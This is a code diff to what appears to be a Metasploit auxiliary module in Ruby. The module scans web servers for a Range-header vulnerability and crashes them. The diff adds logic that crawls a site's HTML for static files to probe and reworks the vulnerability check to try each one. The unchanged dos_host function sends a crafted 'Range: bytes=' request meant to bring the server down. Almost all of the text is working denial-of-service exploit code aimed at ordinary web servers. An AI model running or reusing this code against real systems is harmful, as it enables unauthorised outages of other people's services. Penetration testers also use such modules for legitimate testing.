@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'A valid file resource', '/welcome.png'])
+        OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/'])
       ], self.class)
 
     deregister_options('RHOST')
@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
     @file_size ||= lambda {
       file_size = -1
       uri = normalize_uri(target_uri.path)
-      res = send_request_raw({'uri'=>uri})
+      res = send_request_raw('uri' => uri)
 
       unless res
         vprint_error("#{ip}:#{rport} - Connection timed out")
@@ -87,7 +87,6 @@ class Metasploit3 < Msf::Auxiliary
     }.call
   end
 
-
   def dos_host(ip)
     file_size = get_file_size(ip)
     lower_range = file_size - 2
@@ -97,13 +96,13 @@ class Metasploit3 < Msf::Auxiliary
     begin
       cli = Rex::Proto::Http::Client.new(ip)
       cli.connect
-      req = cli.request_raw({
+      req = cli.request_raw(
         'uri' => uri,
         'method' => 'GET',
         'headers' => {
           'Range' => "bytes=#{lower_range}-#{upper_range}"
         }
-      })
+      )
       cli.send_request(req)
     rescue ::Errno::EPIPE, ::Timeout::Error
       # Same exceptions the HttpClient mixin catches
@@ -111,25 +110,69 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{ip}:#{rport} - DOS request sent")
   end
 
-
-  def check_host(ip)
-    return Exploit::CheckCode::Unknown if get_file_size(ip) == -1
-
+  def potential_static_files_uris
     uri = normalize_uri(target_uri.path)
-    res = send_request_raw({
-      'uri' => uri,
-      'method' => 'GET',
-      'headers' => {
-        'Range' => "bytes=0-#{upper_range}"
-      }
-    })
-    if res && res.body.include?('Requested Range Not Satisfiable')
-      return Exploit::CheckCode::Vulnerable
-    elsif res && res.body.include?('The request has an invalid header name')
-      return Exploit::CheckCode::Safe
-    else
-      return Exploit::CheckCode::Unknown
+
+    return [uri] unless uri[-1, 1] == '/'
+
+    uris = ["#{uri}welcome.png"]
+    res  = send_request_raw('uri' => uri, 'method' => 'GET')
+
+    return uris unless res
+
+    site_uri = URI.parse(full_uri)
+
+    Nokogiri::HTML(res.body).xpath('//link|//script|//style|//img').each do |tag|
+      %w(href src).each do |attribute|
+        begin
+          attr_value = tag[attribute]
+
+          next unless attr_value && !attr_value.empty?
+
+          uri = site_uri.merge(URI.encode(attr_value.strip))
+
+          next unless uri.host == vhost || uri.host == rhost
+
+          uris << uri.path if uri.path =~ /\.[a-z]{2,}$/i # Only keep path with a file
+        rescue => e
+          vprint_error("#{peer} - #{e}")
+          next
+        end
+      end
     end
+
+    uris.uniq
   end
 
+  def check_host(ip)
+    potential_static_files_uris.each do |potential_uri|
+      uri = normalize_uri(potential_uri)
+
+      res = send_request_raw(
+        'uri' => uri,
+        'method' => 'GET',
+        'headers' => {
+          'Range' => "bytes=0-#{upper_range}"
+        }
+      )
+
+      vmessage = "#{peer} - Checking #{uri} [#{res.code}]"
+
+      if res && res.body.include?('Requested Range Not Satisfiable')
+        print_status("#{vmessage} - Vulnerable")
+
+        target_uri.path = uri # Needed for the DoS attack
+
+        return Exploit::CheckCode::Vulnerable
+      elsif res && res.body.include?('The request has an invalid header name')
+        vprint_status("#{vmessage} - Safe")
+
+        return Exploit::CheckCode::Safe
+      else
+        vprint_status("#{vmessage} - Unknown")
+      end
+    end
+
+    Exploit::CheckCode::Unknown
+  end
 end
